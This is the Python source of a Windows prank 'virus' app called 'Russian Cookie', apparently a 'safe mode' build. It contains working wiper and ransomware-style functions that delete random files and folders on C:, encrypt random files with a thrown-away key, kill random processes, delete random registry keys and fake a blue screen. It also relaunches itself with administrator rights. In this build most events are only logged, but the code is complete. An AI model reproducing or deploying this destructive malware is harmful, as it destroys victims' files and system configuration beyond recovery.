


"""
RUSSIAN COOKIE SAFE MODE
EVERTHING WORK, JUST SAFE FOR TESTS

APP DEV : BOuletteRusSe
SOME IDEAS AND THANKS TO : Shagaii
APP TESTERS : BOuletteRusSe, Shagaii

BANANA CURSORS : http://www.rw-designer.com/cursor-set/rainbow-banana-solid-colors
TRIGGER MODE MUSIC (Nyan Cat But In Negative Harmony) : https://www.youtube.com/watch?v=ekWH6zqZGYM
SKULLHEAD IMAGE : https://toppng.com/show_download/284806/sticker-tete-de-mort-os-noirs-simple-skull-and-cross-bones/large
GUN IMAGE : https://knowyourmeme.com/photos/1705218-hand-pointing-a-gun
Sorry I couldn't find the others sources...

DEVELOPPEMENT STARTED AT : Tuesday, 21st Septembre 2021, 17:22:54

2022 © All rights reserved.
"""


import os
import tkinter
import winreg as reg
from ctypes import windll
from string import printable
from glob import glob
from simpleaudio import WaveObject
from json import load, dump
from random import choice, randint, random
from psutil import process_iter
from pathlib import Path
from signal import SIGBREAK
from webbrowser import open_new
from shutil import rmtree
from sys import executable, argv
from pyautogui import hotkey
from cryptography.fernet import Fernet
from autoit import win_move
from tkinter import *
    

if True:
    
    # Possible event
    def rndFile(folder=False, file=False):
        
        percent_to_continue = 0
        # path = choice(psutil.disk_partitions())[0].replace("\\", "")
        path = "C:"
        
        while True:
            
            try: path = choice(glob(f"{path}/*"))
            except:
                percent_to_continue = 0
                # path = choice(psutil.disk_partitions())[0].replace("\\", "")
                path = "C:"
                continue
            
            if os.path.isdir(path):
                
                if len(path) == 0:
                    percent_to_continue = 0
                    # path = choice(psutil.disk_partitions())[0].replace("\\", "")
                    path = "C:"
                    continue
                
                if random() < percent_to_continue: 
                    try: 
                        path = path.replace("\\", "/")
                        if folder: return path
                        else: 0 / 0
                    except:
                        percent_to_continue = 0
                        # path = choice(psutil.disk_partitions())[0].replace("\\", "")
                        path = "C:"
                        continue
                
                percent_to_continue += 0.1
                
            else:
                try: 
                    path = path.replace("\\", "/")
                    if file: return path
                    else: 0 / 0
                except:
                    percent_to_continue = 0
                    # path = choice(psutil.disk_partitions())[0].replace("\\", "")
                    path = "C:"
                    continue
    
    # Possible event  
    def delAll(path):
        
        while True:
        
            try:
            
                if not "Russian" in path:
                
                    if os.path.isdir(path):
                        rmtree(path)
                        path = path.replace('/', '\\')
                        return f"Folder deleted : {path}"
                    else: 
                        os.remove(path)
                        path = path.replace('/', '\\')
                        return f"File deleted : {path}"
                    
                else: return "The virus prevented self-deletion."
                
            except: path = rndFile(folder=True, file=True)
             
    # Possible event       
    def cptFile(path):
        
        while True:
        
            try:
                
                if not "Russian" in path:
            
                    fernet = Fernet(Fernet.generate_key())
                    with open(path, 'rb') as f: original = f.read()
                    with open(path, 'wb') as encrypted_file: encrypted_file.write(fernet.encrypt(original))
                    
                    path = path.replace('/', '\\')
                    return f"File crypted : {path}"
                
                else: return "Virus prevented from self-encrypting."    
                
            except: path = rndFile(file=True)
    
    # Possible event
    def kilProcess():
        
        while True:
            
            try:       
                process_dict = {}
    
                for p in process_iter(): process_dict[p.pid] = p.name()
                
                k = choice(list(process_dict.keys()))
                
                if process_dict[k] not in ["svchost.exe", "gui.exe"]:
                    os.kill(k, SIGBREAK)  
                    return f"Process stopped : {process_dict[k]}"
                    
            except: continue

    # Possible event
    def strFile(path):
        
        while True:
        
            try: 
                os.startfile(path)
                
                path = path.replace('/', '\\')
                return f"File started : {path}"
            
            except: path = rndFile(file=True)
    
    # Possible event
    def addFile(path):
        
        while True:
        
            try:
            
                name = ""
                for i in range(randint(1, 10)): name += choice(printable)
                    
                ext = ""
                for i in range(2, 5): ext += choice(printable)
                    
                with open(f"{path}/{name}.{ext}", "w+") as f: f.write(f"{str(name) * 100}\n")
                
                path = path.replace('/', '\\')
                return f"File {name}.{ext} created at {path}"
                
            except: path = rndFile(folder=True)
    
    # Possible event
    def delRegKey():
        
        def RandomKeyChose(base_key: reg.HKEYType, hkey: int):
        
            global key_name
            
            try: 
                rd_key_index = randint(0, reg.QueryInfoKey(base_key)[0]) 
                rd_key = reg.EnumKey(base_key, rd_key_index)
                key_name = key_name + rd_key + '\\'
                base_key = reg.OpenKey(hkey, key_name, 0, reg.KEY_ALL_ACCESS)
                RandomKeyChose(base_key, hkey)
                
            except: 
                key_info = reg.EnumValue(base_key, rd_key_index)
                reg.DeleteKeyEx(base_key, key_info[0])

        global key_name
    
        key_name = str()
        hkey_list = [reg.HKEY_CLASSES_ROOT, reg.HKEY_CURRENT_CONFIG, reg.HKEY_CURRENT_USER, reg.HKEY_DYN_DATA, reg.HKEY_LOCAL_MACHINE, reg.HKEY_PERFORMANCE_DATA, reg.HKEY_USERS]

        while True:

            hkey = choice(hkey_list)
            
            try:
                base_key = reg.OpenKey(hkey, r'', 0, reg.KEY_ALL_ACCESS)
                RandomKeyChose(base_key, hkey)
                return "Register located at %s deleted !" % (key_name)
                                
            except:
                key_name = str()
                continue
    
    # Possible event              
    def Bsod():
        os.system("taskkill /f /im explorer.exe")
        hotkey("win", "d")
        os.startfile("BSoD.exe")
        window.destroy()
    
    # Center the window by the screen
    def Center(win):
        win.update_idletasks()
        width = win.winfo_width()
        frm_width = win.winfo_rootx() - win.winfo_x()
        win_width = width + 2 * frm_width
        height = win.winfo_height()
        titlebar_height = win.winfo_rooty() - win.winfo_y()
        win_height = height + titlebar_height + frm_width
        x = win.winfo_screenwidth() // 2 - win_width // 2
        y = win.winfo_screenheight() // 2 - win_height // 2
        win.geometry('{}x{}+{}+{}'.format(width, height, x, y))
        win.deiconify()

    def CommingSoon(): # IDK
        global text_action, color
        text_action = "Comming Soon !"
        color = "#0E5395"

    def SettingsSaveWrite(k):
        
        global settings, save_settings
        
        settings["save_settings"][k] = save_settings[k].get()
            
        with open("settings.json", "w") as j: dump(settings, j, indent=4)
           
    def ClosePopup():
        
        global settings
        
        settings["first_start"] = False
        
        with open("settings.json", "w") as f: dump(settings, f, indent=4)
        
        link.destroy()
        LoadApp()
        
    def OpenLogs():
        try:
            os.startfile(r"events.log")
        except:
            with open('events.log', 'a+', encoding='utf-8') as logs:
                os.startfile(r"events.log")
    
    # Cursor Changer for Trigger Mode
    def ChangeCursor():
        
        dancing_banana = r'%s\assets\cursors\Dancing Banana.ani' % (Path().resolve())
        dancing_banana_help = r'%s\assets\cursors\Dancing Banana Help.ani' % (Path().resolve())
        dancing_banana_working = r'%s\assets\cursors\Dancing Banana Working in Background.ani' % (Path().resolve())
        dancing_banana_busy = r'%s\assets\cursors\Dancing Banana Busy.ani' % (Path().resolve())
        dancing_banana_precision = r'%s\assets\cursors\Dancing Banana Precision Select.ani' % (Path().resolve())
        dancing_banana_text = r'%s\assets\cursors\Dancing Banana Text Select.ani' % (Path().resolve())
        dancing_banana_handwriting = r'%s\assets\cursors\Dancing Banana Handwriting.ani' % (Path().resolve())
        dancing_banana_unavaible = r'%s\assets\cursors\Dancing Banana Unvailable.ani' % (Path().resolve())
        dancing_banana_vertical = r'%s\assets\cursors\Dancing Banana Vertical Resize.ani' % (Path().resolve())
        dancing_banana_horizontal = r'%s\assets\cursors\Dancing Banana Horizontal Resize.ani' % (Path().resolve())
        dancing_banana_diago1 = r'%s\assets\cursors\Dancing Banana Diagonal Resize 1.ani' % (Path().resolve())
        dancing_banana_diago2 = r'%s\assets\cursors\Dancing Banana Diagonal Resize 2.ani' % (Path().resolve())
        dancing_banana_move = r'%s\assets\cursors\Dancing Banana Move.ani' % (Path().resolve())
        dancing_banana_alternate = r'%s\assetscursors\Dancing Banana Alternate Select.ani' % (Path().resolve())
        dancing_banana_link = r'%s\assets\cursors\Dancing Banana Link Select.ani' % (Path().resolve())
        
        cursors = reg.OpenKey(reg.HKEY_CURRENT_USER, r'Control Panel\Cursors', 0, reg.KEY_ALL_ACCESS)
        
        reg.SetValueEx(cursors, 'Arrow', 0, reg.REG_EXPAND_SZ, dancing_banana)
        reg.SetValueEx(cursors, 'Appstarting', 0, reg.REG_EXPAND_SZ, dancing_banana_working)
        reg.SetValueEx(cursors, 'Crosshair', 0, reg.REG_EXPAND_SZ, dancing_banana_precision)
        reg.SetValueEx(cursors, 'Hand', 0, reg.REG_EXPAND_SZ, dancing_banana_link)
        reg.SetValueEx(cursors, 'Help', 0, reg.REG_EXPAND_SZ, dancing_banana_help)
        reg.SetValueEx(cursors, 'IBeam', 0, reg.REG_EXPAND_SZ, dancing_banana_text)
        reg.SetValueEx(cursors, 'No', 0, reg.REG_EXPAND_SZ, dancing_banana_unavaible)
        reg.SetValueEx(cursors, 'NWPen', 0, reg.REG_EXPAND_SZ, dancing_banana_handwriting)
        reg.SetValueEx(cursors, 'Person', 0, reg.REG_EXPAND_SZ, dancing_banana_link)
        reg.SetValueEx(cursors, 'Pin', 0, reg.REG_EXPAND_SZ, dancing_banana_link)
        reg.SetValueEx(cursors, 'SizeAll', 0, reg.REG_EXPAND_SZ, dancing_banana_move)
        reg.SetValueEx(cursors, 'SizeNESW', 0, reg.REG_EXPAND_SZ, dancing_banana_diago2)
        reg.SetValueEx(cursors, 'SizeNS', 0, reg.REG_EXPAND_SZ, dancing_banana_vertical)
        reg.SetValueEx(cursors, 'SizeNWSE', 0, reg.REG_EXPAND_SZ, dancing_banana_diago1)
        reg.SetValueEx(cursors, 'SizeWE', 0, reg.REG_EXPAND_SZ, dancing_banana_horizontal)
        reg.SetValueEx(cursors, 'UpArrow', 0, reg.REG_EXPAND_SZ, dancing_banana_alternate)
        reg.SetValueEx(cursors, 'Wait', 0, reg.REG_EXPAND_SZ, dancing_banana_busy)
    
    # Validation window for Trigger Mode
    def ValidationPopup():
        
        def No():
            global pn
            validation_win.destroy()
            pn = False
            
        def Yes():
            global trigger_mode
            validation_win.destroy()
            window.title("Russian Cookie [TRIGGER MODE]")
            window.iconbitmap("assets/triggered_logo.ico")
            Center(window)
            skullhead_button.destroy()
            main_canvas.configure(bg='red')
            gun_button.configure(bg='red', activebackground='red')
            menu.destroy()
            list_canvas.configure(bg="#690000")
            # ChangeCursor()
            Center(window)
            trigger_mode = True
            TriggerMode()
        
        global pn, validation_win
        
        if not pn:
        
            pn = True
            
            # Window Config
            validation_win = Tk()
            validation_win.title("Are you sure ?")
            validation_win.iconbitmap("assets/logo.ico")
            ww = round(500)
            wh = round(250)
            validation_win.configure(background='#42507D')
            validation_win.geometry(f"{ww}x{wh}")
            validation_win.maxsize(ww, wh)
            validation_win.minsize(ww, wh)
            validation_win.wm_attributes("-topmost", True)
            validation_win.protocol("WM_DELETE_WINDOW", lambda: None)
            
            Center(validation_win)
            
            ptitle = Label(validation_win, text="Are you sure you\nwant to do this ?", fg="red", font=("Source Code Pro", 20), bg="#42507D")
            ptitle_2 = Label(validation_win, text="This mode is not recommended for epileptics and\n anyone who wants to keep their computer alive.", fg="red", font=("Source Code Pro", 13), bg="#42507D")
            no = Button(validation_win, cursor="hand2", relief=FLAT, bg="red", border=1, height=0, width=0, fg="black", text="No, I won't !", font=("Source Code Pro", 10), activeforeground="black", activebackground="white", command=No)
            yes = Button(validation_win, cursor="hand2", relief=FLAT, bg="green", border=1, height=0, width=0, fg="black", text="Let's go", font=("Source Code Pro", 10), activeforeground="black", activebackground="white", command=Yes)
            
            ptitle.pack(ipadx=ww//2, ipady=5)
            ptitle_2.pack(ipadx=ww//2, ipady=10)
            no.pack(ipadx=50, ipady=25)
            yes.pack(ipadx=20, ipady=20, side=tkinter.RIGHT)
    
    # When trigger mode is active    
    def TriggerMode():
        
        global text_action, h
        
        banana = Toplevel(window) 
        banana.overrideredirect(True)
        banana.wm_attributes("-topmost", True)
        banana.wm_attributes('-transparentcolor', 'white')
        banana.title('banana')
        banana.geometry("500x500")
        banana.protocol("WM_DELETE_WINDOW", lambda: None)
        
        __w__ = 500
        __h__ = 500
        
        c = Canvas(banana, highlightthickness=0, width=__w__, height=__h__, bg='white')
        image = PhotoImage(file='assets/banana.png')
        c.create_image(__w__//2, __h__//2, image=image)
        c.pack()

        posx = 0
        posy = 0
        count = 0
        rd = randint(0, 750)
        left = False
        top = False
        
        triggered_music.play()

        while True:
            
            count += 1
  
            if count == rd:
                onClick()
                count = 0
                rd = randint(0, 750)
                
            try:
        
                if text_action is not None:
                    
                    shot = True
                 
                    for t in nothing_texts:
                        if text_action == t:
                            shot = False
                    
                    if shot and save_settings["Sounds"].get():
                        gun_button.configure(image=gunshot)
                        shot_audio.play()
                        window.after(100, lambda: gun_button.configure(image=gun))
                    
                    with open('events.log', 'a+', encoding='utf-8') as events_log:
                        events_log.write('%s\n' % (text_action))
                    
                    h += le
                    if h >= mch:
                        list_canvas.delete("all")
                        h = le
                    if len(text_action) > linejmp: 
                        list_canvas.create_text(0, h, text=f">  {text_action[:linejmp]}", font=('Consolas', ps), fill=color, anchor="w")
                        h += le
                        list_canvas.create_text(0, h, text=f"   {text_action[linejmp:]}", font=('Consolas', ps), fill=color, anchor="w")
                    else: list_canvas.create_text(0, h, text=f">  {text_action}", font=('Consolas', ps), fill=color, anchor="w")
                    text_action = None
                window.update()
            
            except: break
            
            try: banana.update()
            except: break
            
            try: win_move('banana', posx, posy)
            except: continue
            
            if posx <= 0: left = False
            elif posx >= banana.winfo_screenwidth()-__w__: left = True
            if posy <= 0: top = False
            elif posy >= banana.winfo_screenheight()-__h__: top = True
            if left: posx -= 1
            else: posx += 1
            if top: posy -= 1
            else: posy += 1
    
    # Load the application
    def LoadApp():
        
        global menu
        
        main_canvas.delete("all")
        main_canvas.create_window(mcw/2, mch/1.92, window=gun_button)
        main_canvas.create_window(mcw/7.2, mch/1.107692307692308, window=open_logs_button)
        main_canvas.create_window(mcw/1.028571428571429, mch/14.4, window=skullhead_button)
        
        menu.destroy()
        menu = Menu(window, tearoff=0)
        window.config(menu=menu)
        menu.add_command(label="Settings", command=LoadSettings)
        menu.add_command(label="About...", command=lambda: open_new("https://github.com/BOuletteRusSe/RussianCookie"))

    # Load Settings Window
    def LoadSettings():
        
        main_canvas.delete("all")
        main_canvas.create_rectangle(mcw/2-mcw/2.25, mch/2-mch/2.5, mcw/2+mcw/2.25, mch/2+mch/2.5, fill="#273746", width=round(ww*wh/108000), outline='#1C2833')
        main_canvas.create_window(mcw/1.0945273631840796019900497512438, mch/6.8571428571428571428571428571429, window=quit_button)
        main_canvas.create_window(mcw/2, 125, window=settings_title)
        main_canvas.create_window(mcw/10.891089108910891089108910891089, mch/2.88, window=sound_c)
        main_canvas.create_window(mcw/10.47619047619047619047619047619, mch/2.440677966101695, window=deleting_c)
        main_canvas.create_window(mcw/10, mch/2.117647058823529, window=encrypting_c)
        main_canvas.create_window(mcw/10.78431372549019607843137254902, mch/1.846153846153846, window=starting_c)
        main_canvas.create_window(mcw/10.679611650485436893203883495146, mch/1.655172413793103, window=creating_c)
        main_canvas.create_window(mcw/11, mch/1.5, window=taskkill_c)
        main_canvas.create_window(mcw/11.578947368421052631578947368421, mch/1.371428571428571, window=bsod_c)
        main_canvas.create_window(mcw/10.679611650485436893203883495146, mch/1.263157894736842, window=nothing_c)
        main_canvas.create_window(mcw/8.75, mch/1.170731707317073, window=register_deleting_c)

    # Event when user click on the gun
    def onClick():
        
        global text_action, gun_button, color
        
        while True:
        
            rda = randint(0, 100)
               
            if 0 < rda <= 1 and save_settings["Bsod"].get() and not trigger_mode: Bsod()
            elif 1 < rda <= 10 and save_settings["Nothing"].get() and not trigger_mode:
                text_action = choice(nothing_texts)
                color = "#cfcfb8"
                break
            elif 10 < rda <= 25 and (save_settings["Deleting"].get() or trigger_mode):
                text_action = "delAll(rndFile(folder=True, file=True))"
                color = "#E20808"
                break
            elif 25 < rda <= 35 and (save_settings["Encrypting"].get() or trigger_mode):
                text_action = "cptFile(rndFile(file=True))"
                color = "#E208B4"
                break
            elif 35 < rda <= 55 and (save_settings["Starting"].get() or trigger_mode):
                text_action = "strFile(rndFile(file=True))"
                color = "#42BF20"
                break
            elif 55 < rda <= 65 and (save_settings["Creating"].get() or trigger_mode):
                text_action = "addFile(rndFile(folder=True))"
                color = "#0843E2"
                break
            elif 65 < rda <= 85 and (save_settings["Taskkill"].get() or trigger_mode):
                text_action = "kilProcess()"
                color = "#DA5914"
                break
            elif 85 < rda <= 100 and (save_settings["Register-Deleting"].get() or trigger_mode):
                text_action = "delRegKey()"
                color = "#1DF7AF"
                break
            else:
                c = True
                for v in save_settings.values():
                    if v.get():
                        c = False
                if c and not trigger_mode:
                    text_action = "You must activate at least one event in the settings !"
                    color = "#E20808"
                    break
    
    # Window
    window = Tk()
    window.title("Russian Cookie")
    window.iconbitmap("assets/logo.ico")
    ww = round(window.winfo_screenwidth() / 1.28)
    wh = round(window.winfo_screenheight() / 1.5)
    window.configure(background='black')
    window.geometry(f"{ww}x{wh}")
    window.maxsize(ww, wh)
    window.minsize(ww, wh)
    Center(window)
    
    # Some variables
    pn = False
    trigger_mode = False
    nothing_texts = ["You haven't had anything... So far!", "Not for today...", "Nop :/", "NO NO NO!", "You are lucky men <:(", "Don't laugh too much, just wait until your pc is destroyed >:)", "You sign the death warrant of your pc guy", "Just focus clicking on the gun button bro", "Nothing special today :')", "nothing.", "if you keep clicking that button i'm gonna have to come to your house", "stop", "boom", "always not", "ok", "Nothing to report"]

    # Check if is the first start
    with open("settings.json", "r") as j: 
        settings = load(j)
    save_settings = dict(settings["save_settings"])
    first_start = bool(settings["first_start"])
    for k, b in save_settings.items(): 
        ex = BooleanVar()
        ex.set(b)
        save_settings[k] = ex

    # Canvas
    mcw = round(ww / 1.3636363636363636363636363636364)
    mch = round(wh / 1)
    lcw = round(ww / 3.75)
    list_canvas = Canvas(window, width=lcw, height=mch, highlightthickness=0, bg='#292926')
    main_canvas = Canvas(window, width=mcw, height=mch, highlightthickness=0, bg='#4e4e47')
    
    # Menu
    menu = Menu(window, tearoff=0)
    window.config(menu=menu)
    menu.add_command(label="About...", command=lambda: open_new("https://github.com/BOuletteRusSe/RussianCookie"))
    
    # Load Assets
    shot_audio = WaveObject.from_wave_file("assets/shot.wav")
    gun = PhotoImage(file="assets/gun.png")
    skullhead = PhotoImage(file="assets/skullhead.png")
    gunshot = PhotoImage(file="assets/gunshot.png")
    triggered_music = WaveObject.from_wave_file("assets/nyan_cat_music.wav")
    quit_png = PhotoImage(file="assets/quit.png")
    
    # Main menu
    gun_button = Button(window, background="#4e4e47", activebackground="#4e4e47", command=onClick, relief=FLAT, image=gun, borderwidth=0, cursor="hand2")
    open_logs_button = Button(window, cursor="hand2", relief=FLAT, bg="#24B7C1", border=0, height=round(mch/144), width=round(mcw/36.666666666666666666666666666667), fg="#262828", text="Open Events Log", font=("Cascadia Mono", round(ww*wh/108000)), activeforeground="#BCC9CA", activebackground="#1ACCD8", command=OpenLogs)
    skullhead_button = Button(window, background="#4e4e47", activebackground="#4e4e47", command=ValidationPopup, relief=FLAT, image=skullhead, borderwidth=0, cursor="hand2")

    # First start
    link = Label(window, text="Github", fg="blue", bg="#697783", cursor="hand2", font=("Cascadia Code SemiLight", round(ww*wh/72000)))
    title = Label(window, text="Hey you ! Thank you for downloading this app !", fg="#283747", font=("Carlito", round(ww*wh/36000), "underline"), bg="#697783")
    sl = Label(window, font=("Cascadia Code SemiLight", round(ww*wh/72000)), bg="#697783", fg="#D8D3E3", text="For more info or help you can take a look on the       .\nDon't hesitate to share the app with your friends and suggest changes !")
    ok_button = Button(window, cursor="hand2", relief=FLAT, bg="#24B7C1", border=0, height=round(mch/144), width=round(mcw/36.666666666666666666666666666667), fg="#262828", text="I'm ok !", font=("Cascadia Mono", round(ww*wh/108000)), activeforeground="#BCC9CA", activebackground="#1ACCD8", command=ClosePopup)

    # Settings
    quit_button = Button(window, cursor="hand2", image=quit_png, relief=FLAT, borderwidth=0, command=LoadApp, activebackground="#273746", background="#273746")
    settings_title = Label(window, text="Settings", fg="#5D6D7E", font=("Carlito", round(ww*wh/21600), "underline"), bg="#273746")
    sound_c = Checkbutton(window, cursor="hand2", text="Sound", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Sounds"], command=lambda: SettingsSaveWrite("Sounds"))
    deleting_c = Checkbutton(window, cursor="hand2", text="Deleting", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Deleting"], command=lambda: SettingsSaveWrite("Deleting"))
    encrypting_c = Checkbutton(window, cursor="hand2", text="Encrypting", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Encrypting"], command=lambda: SettingsSaveWrite("Encrypting"))
    starting_c = Checkbutton(window, cursor="hand2", text="Starting", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Starting"], command=lambda: SettingsSaveWrite("Starting"))
    creating_c = Checkbutton(window, cursor="hand2", text="Creating", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Creating"], command=lambda: SettingsSaveWrite("Creating"))
    taskkill_c = Checkbutton(window, cursor="hand2", text="Taskkill", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Taskkill"], command=lambda: SettingsSaveWrite("Taskkill"))
    bsod_c = Checkbutton(window, cursor="hand2", text="Bsod", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Bsod"], command=lambda: SettingsSaveWrite("Bsod"))
    nothing_c = Checkbutton(window, cursor="hand2", text="Nothing", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Nothing"], command=lambda: SettingsSaveWrite("Nothing"))
    register_deleting_c = Checkbutton(window, cursor="hand2", text = "Register Deleting", fg="red", bg="#273746", activebackground="#273746", activeforeground="red", relief=FLAT, onvalue=True, offvalue=False, variable=save_settings["Register-Deleting"], command=lambda: SettingsSaveWrite("Register-Deleting"))

    # Canvas things
    h = 0
    le = round((ww * wh) / 72000)
    ps = round((ww * wh) / 108000)
    linejmp = round((ww * wh) / 20000)
    texts = []
    text_action = None
    color = "black"

    main_canvas.place(x=0, y=0)
    list_canvas.place(x=mcw, y=0)
    
    # Check first start
    if not first_start:
        LoadApp()
        
    else:
        main_canvas.create_rectangle(mcw/2-mcw/2.5, mch/2-mch/2.75, mcw/2+mcw/2.5, mch/2+mch/2.75, fill="#697783", width=round(ww*wh/108000), outline='#202225')
        main_canvas.create_window(mcw/2, mch/2-210, window=title)
        main_canvas.create_window(mcw/2, mch/2-125, window=sl)
        main_canvas.create_window(mcw/2, mch/2+175, window=ok_button)
        link.place(x=mcw/1.3836477987421383647798742138365, y=mch/3.4951456310679611650485436893204)
        link.bind("<Button-1>", lambda e: open_new("https://github.com/BOuletteRusSe/RussianCookie"))
        link.lift()
    
    # Main while
    while True:
        
        try:
        
            shot = True
        
            if text_action is not None:
                for t in nothing_texts:
                    if text_action == t:
                        shot = False
                
                if shot and save_settings["Sounds"].get():
                    gun_button.configure(image=gunshot)
                    shot_audio.play()
                    window.after(100, lambda: gun_button.configure(image=gun))
                
                # Write event in log
                with open('events.log', 'a+', encoding='utf-8') as events_log:
                    events_log.write('%s\n' % (text_action))
                
                # Write last event in canvas
                h += le
                if h >= mch:
                    list_canvas.delete("all")
                    h = le
                if len(text_action) > linejmp: 
                    list_canvas.create_text(0, h, text=f">  {text_action[:linejmp]}", font=('Consolas', ps), fill=color, anchor="w")
                    h += le
                    list_canvas.create_text(0, h, text=f"   {text_action[linejmp:]}", font=('Consolas', ps), fill=color, anchor="w")
                else: list_canvas.create_text(0, h, text=f">  {text_action}", font=('Consolas', ps), fill=color, anchor="w")
                text_action = None
            window.update()
            
        except: break

else: windll.shell32.ShellExecuteW(None, "runas", executable, " ".join(argv[0:]), None, 1)
